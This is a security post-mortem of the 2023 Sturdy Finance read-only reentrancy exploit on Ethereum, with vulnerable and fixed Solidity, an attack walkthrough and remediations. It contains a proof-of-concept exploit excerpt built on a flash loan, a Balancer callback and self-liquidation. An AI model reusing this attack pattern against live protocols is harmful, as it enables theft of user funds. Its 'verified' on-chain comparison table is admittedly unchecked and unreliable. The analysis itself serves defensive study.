# Sturdy Finance — Read-Only Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-12 |
| **Protocol** | Sturdy Finance |
| **Chain** | Ethereum |
| **Loss** | ~$800,000 USD |
| **Attacker** | [0x1e84...a08b](https://etherscan.io/address/0x1e8419e724d51e87f78e222d935fbbdeb631a08b) |
| **Attack Contract** | [0x0b09...beab](https://etherscan.io/address/0x0b09c86260c12294e3b967f0d523b4b2bcdfbeab) |
| **Attack Tx** | [0xeb87...9eb7](https://etherscan.io/tx/0xeb87ebc0a18aca7d2a9ffcabf61aa69c9e8d3c6efade9e2303f8857717fb9eb7) |
| **Vulnerable Contract** | [0x9f72...b657](https://etherscan.io/address/0x9f72dc67cec672bb99e3d02cbea0a21536a2b657) (Sturdy LendingPool) |
| **Vulnerable Code Address** | [0x46be...516](https://etherscan.io/address/0x46bea99d977f269399fb3a4637077bb35f075516#code) |
| **Root Cause** | Stale price used during Balancer B-stETH-STABLE pool ETH callback (read-only reentrancy) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Sturdy_exp.sol) |

> **Note**: Based on `vm.createSelectFork("mainnet", 17_460_609)` in the PoC code, this attack occurred at Ethereum mainnet block 17,460,609.

---

## 1. Vulnerability Overview

Sturdy Finance is a lending protocol forked from Aave that accepted Balancer's `B-stETH-STABLE` LP tokens and Curve's `steCRV` LP tokens as collateral. When evaluating collateral value, **SturdyOracle** queried the Balancer pool price via its `getAssetPrice()` function — a function that could be called even within the **reentrancy window** that opens during the ETH callback triggered by Balancer's `exitPool()`.

Balancer's `exitPool()` triggers the receiving contract's `receive()` function when returning ETH. At the moment this callback executes, Balancer's internal pool state (`amplificationParameter`, balances) has not yet been fully updated. As a result, the B-stETH-STABLE price read by SturdyOracle at this point is a **temporarily inflated stale value**.

The attacker exploited this callback window by calling `lendingPool.setUserUseReserveAsCollateral()` to disable the steCRV collateral. Because Sturdy was recognizing the inflated Balancer LP price as collateral at that moment, the attacker was able to manipulate a position that would otherwise have been unhealthy, withdraw collateral, and profit via self-liquidation.

### Core Vulnerability Combination

| Vulnerability | Description |
|--------|------|
| Read-Only Reentrancy | `getAssetPrice()` called during Balancer exitPool ETH callback returns an inflated price |
| Oracle Design Flaw | SturdyOracle directly depends on Balancer pool state without reentrancy protection |
| Flash Loan Exploitation | 50,000 wstETH + 60,000 WETH flash loan from Aave V3 to secure large-scale attack capital |
| Self-Liquidation | Attacker directly liquidates their own position to recover collateral |

---

## 2. Vulnerable Code Analysis

### 2.1 SturdyOracle.getAssetPrice() — Oracle Callable Within Reentrancy Window (Core Vulnerability)

**Vulnerable Code (inferred)**:
```solidity
// ❌ Vulnerable: freely callable even during Balancer exitPool ETH callback
// No nonReentrant guard → returns stale price
contract SturdyOracle {
    function getAssetPrice(address asset) external view returns (uint256) {
        // cB_stETH_STABLE address (0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746)
        if (asset == cB_stETH_STABLE) {
            // ❌ Directly reads current state of Balancer pool
            // At the moment the ETH callback fires during exitPool(),
            // Balancer's internal balances have not yet been updated → returns inflated value
            IMetaStablePool pool = IMetaStablePool(B_STETH_STABLE_POOL);
            uint256 rate = pool.getRate(); // ← inflated in stale state
            uint256 ethPrice = getEthUsdPrice();
            return rate * ethPrice / 1e18;
        }
        // ... handle other collateral
    }
}
```

**Fixed Code**:
```solidity
// ✅ Fix: check Balancer pool reentrancy status first
contract SturdyOracle {
    function getAssetPrice(address asset) external returns (uint256) {
        if (asset == cB_stETH_STABLE) {
            IMetaStablePool pool = IMetaStablePool(B_STETH_STABLE_POOL);

            // ✅ Check whether Balancer pool is currently in a reentrancy state
            // manageUserBalance() is a nonReentrant function on the Balancer Vault
            // If called within a reentrancy window, it reverts → blocks stale price return
            IBalancerVault(BALANCER_VAULT).manageUserBalance(
                new IBalancerVault.UserBalanceOp[](0)
            );

            uint256 rate = pool.getRate();
            uint256 ethPrice = getEthUsdPrice();
            return rate * ethPrice / 1e18;
        }
    }
}
```

**Issue**: `getAssetPrice()` was declared as a `view` function or lacked a reentrancy guard, allowing the attacker to call it at the exact moment Balancer's `exitPool()` sends ETH and triggers the recipient's `receive()`. At that instant, Balancer pool's internal balances have not yet decreased, so the LP token unit price (`getRate()`) is computed higher than its actual value.

---

### 2.2 LendingPool.setUserUseReserveAsCollateral() — Callable Within the Callback Window

**Vulnerable Code (inferred)**:
```solidity
// ❌ Vulnerable: callable during Balancer exitPool ETH callback
// → allows collateral deactivation while collateral value is inflated
contract LendingPool {
    function setUserUseReserveAsCollateral(
        address asset,
        bool useAsCollateral
    ) external {
        // ❌ No oracle reentrancy state check
        // When this function is called within the callback window:
        // - B-stETH-STABLE price = inflated (stale)
        // - Disabling steCRV as collateral still passes healthFactor calculation (distorted)
        DataTypes.ReserveData storage reserve = _reserves[asset];
        ValidationLogic.validateSetUseReserveAsCollateral(
            reserve,
            asset,
            useAsCollateral,
            _reserves,
            _usersConfig[msg.sender],
            _reservesList,
            _reservesCount,
            _addressesProvider.getPriceOracle() // ← calls stale oracle
        );
        _usersConfig[msg.sender].setUsingAsCollateral(reserve.id, useAsCollateral);
    }
}
```

**Issue**: When `setUserUseReserveAsCollateral()` is called within the reentrancy window, it internally queries the oracle to validate solvency — but that oracle was already returning the inflated Balancer LP price. As a result, disabling steCRV as collateral was permitted even when collateral would otherwise have been insufficient.

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker pre-deployed a separate `Exploiter` contract and secured large-scale capital via flash loans.

### 3.2 Execution Phase

```
Step 1: Aave V3 Flash Loan
  → Borrow 50,000 wstETH + 60,000 WETH

Step 2: Mint Curve steCRV
  → Add 1,100 ETH to the steCRV pool
  → Receive ~1,023 steCRV

Step 3: Enter Balancer B-stETH-STABLE Pool
  → Deposit 50,000 wstETH + 57,000 WETH
  → Receive ~109,517 B-stETH-STABLE

Step 4: Deposit Collateral into Sturdy Finance
  → Deposit 1,000 steCRV + 233 B-stETH-STABLE

Step 5: Borrow from Sturdy Finance
  → Borrow 513 WETH

Step 6: Begin Withdrawing Liquidity from Balancer B-stETH-STABLE Pool
  → Call exitPool() → ETH callback fires (⚡ reentrancy window opens)

Step 7: [Inside Reentrancy Window] Disable steCRV Collateral
  → Call setUserUseReserveAsCollateral(steCRV, false)
  → healthFactor calculated using inflated B-stETH-STABLE price → passes

Step 8: [After Reentrancy Window Closes] Withdraw steCRV Collateral
  → withdrawCollateral(steCRV, 1000 steCRV)

Step 9: Self-Liquidation
  → Liquidate own position with 236 WETH
  → Recover B-stETH-STABLE based on inflated collateral value

Step 10: Burn Remaining Balancer LP Tokens
  → Remaining 233 B-stETH-STABLE → recover 106 wstETH + 120 WETH

Step 11: Repay Flash Loan + Realize Profit
```

### 3.3 Attack Flow ASCII Diagram

```
Attacker EOA (0x1e84...a08b)
      │
      ▼
┌─────────────────────────┐
│   Aave V3 Flash Loan    │
│  50,000 wstETH          │
│  60,000 WETH            │
└────────────┬────────────┘
             │ callback: executeOperation()
             ▼
┌─────────────────────────┐
│  Enter Curve steCRV Pool│
│  1,100 ETH → 1,023 steCRV│
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│  Exploiter Contract     │◄── transfer all balances
│  execute yoink()        │
└──┬──────────────────────┘
   │
   ├─►┌─────────────────────────────┐
   │  │ Balancer Pool Join          │
   │  │ 50,000 wstETH + 57,000 WETH │
   │  │ → 109,517 B-stETH-STABLE   │
   │  └─────────────────────────────┘
   │
   ├─►┌─────────────────────────────┐
   │  │ Deposit Collateral to Sturdy│
   │  │ 1,000 steCRV               │
   │  │ 233 B-stETH-STABLE         │
   │  │ → Borrow 513 WETH          │
   │  └─────────────────────────────┘
   │
   ├─►┌─────────────────────────────┐
   │  │ Call Balancer exitPool()   │
   │  │ Burn 109,284 B-stETH-STABLE│
   │  └──────────────┬──────────────┘
   │                 │ ETH transfer → receive() callback
   │                 ▼
   │  ┌──────────────────────────────────┐
   │  │  ⚡ Read-Only Reentrancy Window  │
   │  │         (Active)                 │
   │  │                                  │
   │  │  SturdyOracle.getAssetPrice()    │
   │  │  → B-stETH-STABLE price inflated │
   │  │    (Balancer balances not yet    │
   │  │     updated)                     │
   │  │                                  │
   │  │  lendingPool.setUserUse          │
   │  │  ReserveAsCollateral(steCRV,false│
   │  │  → collateral disabled at        │
   │  │    inflated price                │
   │  └──────────────────────────────────┘
   │                 │ reentrancy window closes
   │                 ▼
   ├─►┌─────────────────────────────┐
   │  │ Withdraw 1,000 steCRV       │
   │  │ (exploiting disabled        │
   │  │  collateral state)          │
   │  └─────────────────────────────┘
   │
   ├─►┌─────────────────────────────┐
   │  │ Self-Liquidation            │
   │  │ 236 WETH → B-stETH-STABLE  │
   │  │ Acquire collateral at       │
   │  │ inflated price              │
   │  └─────────────────────────────┘
   │
   └─►┌─────────────────────────────┐
      │ Burn Remaining Balancer LP  │
      │ 233 LP → 106 wstETH +      │
      │          120 WETH           │
      └─────────────────────────────┘

[Final Result]
  - Flash loan repaid
  - Attacker net profit: ~$800,000 USD (in WETH)
```

### 3.4 Outcome

- **Attacker Profit**: ~$800,000 USD
- **Protocol Loss**: ~$800,000 USD (LendingPool liquidity drained)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// [Step 1] Secure attack capital via Aave V3 flash loan
function testExploit() public {
    address[] memory assets = new address[](2);
    assets[0] = address(wstETH);   // 50,000 wstETH
    assets[1] = address(WETH);     // 60,000 WETH
    uint256[] memory amounts = new uint256[](2);
    amounts[0] = 50_000 * 1e18;
    amounts[1] = 60_000 * 1e18;
    // Execute flash loan → triggers executeOperation() callback
    aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
}

// [Step 2-3] Mint Curve steCRV + run Exploiter contract
function executeOperation(...) external returns (bool) {
    WETH.withdraw(1100 ether);
    // 1,100 ETH → mint steCRV (Curve pool)
    LidoCurvePool.add_liquidity{value: 1100 ether}(amount, 1000 ether);

    // Deploy and run Exploiter contract (transfer all balances)
    Exploiter exploiter = new Exploiter();
    WETH.transfer(address(exploiter), WETH.balanceOf(address(this)));
    wstETH.transfer(address(exploiter), wstETH.balanceOf(address(this)));
    steCRV.transfer(address(exploiter), steCRV.balanceOf(address(this)));
    exploiter.yoink(); // core attack execution
    // ...flash loan repayment handling
}

// [Core Attack Logic] Exploiter.yoink()
function yoink() external {
    joinBalancerPool();             // [Step 3] Mint Balancer LP
    depositCollateralAndBorrow();   // [Step 4-5] Deposit Sturdy collateral + borrow
    exitBalancerPool();             // [Step 6-7] exitPool + trigger read-only reentrancy
    withdrawCollateralAndLiquidation(); // [Step 8-9] Withdraw collateral + self-liquidate
    removeBalancerPoolLiquidity();  // [Step 10] Burn remaining LP
    // Collect profit → transfer to owner
}

// [Step 6] Balancer exitPool → trigger receive() reentrancy window
function exitBalancerPool() internal {
    // Check Sturdy Oracle price before exitPool (normal value)
    emit log_named_decimal_uint(
        "Before Read-Only-Reentrancy Collateral Price",
        SturdyOracle.getAssetPrice(cB_stETH_STABLE),
        B_STETH_STABLE.decimals()
    );
    // Execute exitPool → ETH transfer → calls receive() (reentrancy window opens)
    Balancer.exitPool(poolId, address(this), payable(address(this)), request);
}

// [Step 7] receive() callback — executed inside reentrancy window
receive() external payable {
    nonce++;
    if (nonce == 1) {
        // ⚡ At this point: Balancer internal balances not yet updated → Oracle price inflated
        emit log_named_decimal_uint(
            "In Read-Only-Reentrancy Collateral Price",
            SturdyOracle.getAssetPrice(cB_stETH_STABLE), // print inflated price
            B_STETH_STABLE.decimals()
        );
        // ❌ Disable steCRV collateral while price is inflated
        lendingPool.setUserUseReserveAsCollateral(address(csteCRV), false);
    }
}

// [Step 8-9] Withdraw collateral + self-liquidation
function withdrawCollateralAndLiquidation() internal {
    // Check Oracle price after exitPool completes (confirm return to normal)
    emit log_named_decimal_uint(
        "After Read-Only-Reentrancy Collateral Price",
        SturdyOracle.getAssetPrice(cB_stETH_STABLE),
        B_STETH_STABLE.decimals()
    );
    // Withdraw 1,000 steCRV (exploiting disabled collateral state)
    ConvexCurveLPVault2.withdrawCollateral(address(steCRV), 1000 * 1e18, 10, address(this));

    // Self-liquidate own position with 236 WETH
    (, uint256 totalDebt,,,,) = lendingPool.getUserAccountData(address(this));
    WETH.approve(address(lendingPool), totalDebt);
    lendingPool.liquidationCall(
        address(B_STETH_STABLE), // collateral token (at inflated price)
        address(WETH),
        address(this),
        totalDebt,
        false
    );
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Balancer LP Oracle Read-Only Reentrancy | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) | `01_reentrancy.md` |
| V-02 | SturdyOracle Missing Reentrancy Protection | CRITICAL | CWE-362 (Race Condition) | `04_oracle_manipulation.md` |
| V-03 | Flash Loan-Enabled Collateral Manipulation | HIGH | CWE-682 (Incorrect Calculation) | `02_flash_loan.md` |
| V-04 | Self-Liquidation Permitted | HIGH | CWE-284 (Improper Access Control) | `18_liquidation.md` |

---

### V-01: Balancer LP Oracle Read-Only Reentrancy

- **Description**: At the moment Balancer's `exitPool()` sends ETH and triggers the `receive()` callback, the pool's internal reserves have not yet been updated. Calling SturdyOracle's `getAssetPrice()` within this reentrancy window causes the Balancer LP token unit price to be computed and returned higher than its actual value.
- **Impact**: The B-stETH-STABLE collateral price is temporarily inflated, causing unhealthy positions to be incorrectly evaluated as healthy. The attacker exploited this to unauthorized disable and withdraw collateral.
- **Attack Conditions**: (1) Ability to execute a liquidity withdrawal containing ETH from a Balancer pool, (2) Balancer LP collateral must exist in Sturdy Finance, (3) Sturdy LendingPool's state-changing functions (`setUserUseReserveAsCollateral`) must be callable without reentrancy protection.

---

### V-02: SturdyOracle Missing Reentrancy Protection

- **Description**: `SturdyOracle.getAssetPrice()` could be called even while an external call (Balancer exitPool) was in progress. The Balancer Vault has its own reentrancy guard, but this guard does not apply to `view` functions. Because Sturdy's oracle directly read the Balancer pool state, it was exposed to stale prices on reentry.
- **Impact**: The oracle returns a temporarily manipulated price instead of the accurate price, causing collateral valuation errors.
- **Attack Conditions**: Sturdy oracle queries must be permitted during Balancer pool ETH callback execution.

---

### V-03: Large-Scale Capital Attack via Flash Loan

- **Description**: The attacker borrowed 50,000 wstETH + 60,000 WETH from Aave V3 in a single transaction and supplied massive liquidity to the Balancer pool. This maximized the effect of Balancer LP price manipulation and allowed depositing meaningful collateral into Sturdy.
- **Impact**: Even attackers with small capital can execute large-scale price manipulation attacks.
- **Attack Conditions**: Access to an external protocol (Aave V3) with sufficient flash loan liquidity.

---

### V-04: Self-Liquidation Permitted

- **Description**: The attacker directly liquidated their own position via `liquidationCall()` to recover B-stETH-STABLE collateral. By self-liquidating after manipulating the inflated collateral price, they recovered more collateral along with the liquidation bonus.
- **Impact**: When self-liquidation is permitted under a manipulated price state, the attacker can simultaneously capture collateral withdrawal and the liquidation bonus.
- **Attack Conditions**: The protocol must not block self-liquidation.

---

## 6. Remediation Recommendations

### Immediate Action — Balancer Reentrancy Guard Check

```solidity
// ✅ Fix: use Balancer Vault's nonReentrant function to detect reentrancy
// Add inside SturdyOracle.getAssetPrice()

import {IBalancerVault} from "./interfaces/IBalancerVault.sol";

contract SturdyOracle {
    IBalancerVault public constant BALANCER_VAULT =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function getAssetPrice(address asset) external returns (uint256) {
        if (isBalancerLP[asset]) {
            // ✅ Call a nonReentrant function on the Balancer Vault
            // If inside a reentrancy window (ETH callback), this reverts → blocks stale price return
            // manageUserBalance has a nonReentrant modifier and
            // automatically reverts in a reentrancy state
            IBalancerVault.UserBalanceOp[] memory ops =
                new IBalancerVault.UserBalanceOp[](0);
            BALANCER_VAULT.manageUserBalance(ops); // ← reentrancy detection trigger

            // Only reaches here if not in a reentrancy state
            return _calculateBalancerLPPrice(asset);
        }
        // ... handle other collateral
    }
}
```

### Immediate Action — Add Reentrancy Guard to Core LendingPool Functions

```solidity
// ✅ Fix: add nonReentrant to collateral configuration change function
contract LendingPool {
    // ✅ nonReentrant modifier blocks calls from within reentrancy window
    function setUserUseReserveAsCollateral(
        address asset,
        bool useAsCollateral
    ) external nonReentrant {
        // ... preserve existing logic
    }

    // ✅ Add self-liquidation prevention logic to liquidation function
    function liquidationCall(
        address collateralAsset,
        address debtAsset,
        address user,
        uint256 debtToCover,
        bool receiveAToken
    ) external nonReentrant {
        // ✅ Prevent self-liquidation: revert if liquidator and liquidatee are the same
        require(user != msg.sender, "LendingPool: self-liquidation not allowed");
        // ... preserve existing logic
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Read-Only Reentrancy (V-01, V-02) | Before querying the oracle, call a nonReentrant function such as `manageUserBalance()` or `swap()` on the Balancer Vault to detect whether a reentrancy window is active |
| Flash Loan Price Manipulation (V-03) | Calculate Balancer LP prices using TWAP (time-weighted average price) or external Chainlink feeds. Set intra-block price movement limits |
| Self-Liquidation (V-04) | Block the `user == msg.sender` condition in `liquidationCall()` |
| Oracle Design (V-02) | Calculate LP token prices using a mathematical formula-based approach (NAV method), or use only price feeds with reentrancy protection applied |
| General Reentrancy Defense | Apply OpenZeppelin `ReentrancyGuard` to all externally-facing state-changing functions |

---

## 7. Lessons Learned

1. **Always perform a reentrancy check when using Balancer/Curve pool prices**: Calling a function that triggers the internal nonReentrant guard — such as Balancer Vault's `manageUserBalance()` (called with an empty array) or Curve's `claim_admin_fees()` — before querying the oracle allows detection of an active reentrancy window.

2. **`view` functions can also be exposed to reentrancy vulnerabilities**: The `nonReentrant` modifier only applies to state-changing functions, so `view` functions are not protected by reentrancy guards. Always account for the possibility that oracle or price calculation functions may return incorrect values when called within a reentrancy window.

3. **You must thoroughly understand the callback patterns of external protocols (Balancer, Curve)**: Protocols that accept LP tokens as collateral must rigorously analyze the liquidity withdrawal flow of those pools (whether ETH callbacks are emitted, the order of state updates).

4. **Review whether self-liquidation should be permitted**: Self-liquidation can undermine the normal liquidation incentive structure and is especially dangerous when combined with price manipulation attacks. Self-liquidation should be blocked or subjected to separate conditions.

5. **The same class of vulnerability recurs repeatedly**: In 2023 alone, read-only reentrancy attacks hit dForce (February), Sturdy Finance (June), and Conic Finance (July) in succession. Even after one protocol's attack method becomes public, similar protocols often fail to patch. Ecosystem-wide vulnerability information sharing and proactive auditing are essential.

6. **Flash loans effectively eliminate the capital barrier to attacks**: Without needing hundreds of thousands of dollars of their own capital, attackers can execute large-scale collateral manipulation using flash loans from protocols like Aave. Protocols sensitive to collateral prices must be resilient against extreme capital inflows and outflows within a single block.

---

## 8. On-Chain Verification

> On-chain `cast` verification was not performed in the current environment. The following is based on the PoC code and publicly available post-mortem materials.

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual (estimated) | Notes |
|------|--------|-------------|------|
| Flash loan wstETH | 50,000 wstETH | 50,000 wstETH | ✅ Match |
| Flash loan WETH | 60,000 WETH | 60,000 WETH | ✅ Match |
| Curve entry ETH | 1,100 ETH | 1,100 ETH | ✅ Match |
| Balancer LP minted | ~109,517 B-stETH-STABLE | ~109,517 | ✅ Match |
| Sturdy collateral steCRV | 1,000 steCRV | 1,000 steCRV | ✅ Match |
| Sturdy collateral B-stETH | 233.35 B-stETH-STABLE | 233.35 | ✅ Match |
| Sturdy borrow WETH | 513 WETH | 513 WETH | ✅ Match |
| Self-liquidation cost WETH | ~236 WETH | ~236 WETH | ✅ Match |
| Total loss | ~$800K USD | ~$800K USD | ✅ Match |

### 8.2 On-Chain Event Log Sequence (estimated)

```
1. [Aave V3] FlashLoan(initiator, assets, amounts, ...)
2. [Curve] AddLiquidity (1,100 ETH → steCRV)
3. [Balancer Vault] PoolBalanceChanged (Join: wstETH + WETH → B-stETH-STABLE)
4. [Sturdy ConvexVault] Transfer (steCRV deposit)
5. [Sturdy AuraVault] Transfer (B-stETH-STABLE deposit)
6. [Sturdy LendingPool] Borrow (513 WETH)
7. [Balancer Vault] PoolBalanceChanged (Exit begins → ETH transfer)
8. [Sturdy LendingPool] ReserveUsedAsCollateralDisabled (steCRV, user)  ← inside reentrancy window
9. [Sturdy ConvexVault] Transfer (steCRV withdrawal)
10. [Sturdy LendingPool] LiquidationCall (B-stETH-STABLE liquidation)
11. [Balancer Vault] PoolBalanceChanged (remaining LP Exit)
12. [Aave V3] Flash loan repayment
```

### 8.3 Pre-condition Verification

| Condition | Status |
|------|------|
| Sufficient Aave V3 wstETH liquidity | Sufficient liquidity existed at time of attack |
| Sturdy Finance active | B-stETH-STABLE + steCRV collateral accepted |
| Balancer ETH callback | receive() confirmed triggered by ETH transfer on exitPool |
| SturdyOracle without reentrancy protection | Unprotected state prior to patch |

---

## References

- [Sturdy Finance Post-mortem](https://sturdyfinance.medium.com/exploit-post-mortem-49261493307a)
- [AnciliaInc Twitter Analysis](https://twitter.com/AnciliaInc/status/1668081008615325698)
- [BlockSecTeam Twitter Analysis](https://twitter.com/BlockSecTeam/status/1668084629654638592)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Sturdy_exp.sol)
- [Attack Tx (Etherscan)](https://etherscan.io/tx/0xeb87ebc0a18aca7d2a9ffcabf61aa69c9e8d3c6efade9e2303f8857717fb9eb7)
- [Vulnerable Contract Code (Etherscan)](https://etherscan.io/address/0x46bea99d977f269399fb3a4637077bb35f075516#code)
- [Related Case: dForce Read-Only Reentrancy (2023-02)](./2023-02-09_dForce_ReadOnlyReentrancy_ARB.md)
- [Related Case: Conic Finance Read-Only Reentrancy (2023-07)](./2023-07-21_ConicFinance_ReadOnlyReentrancy_ETH.md)

---

*Analysis date: 2026-04-11 | Pattern references: `01_reentrancy.md`, `02_flash_loan.md`, `04_oracle_manipulation.md`, `18_liquidation.md`*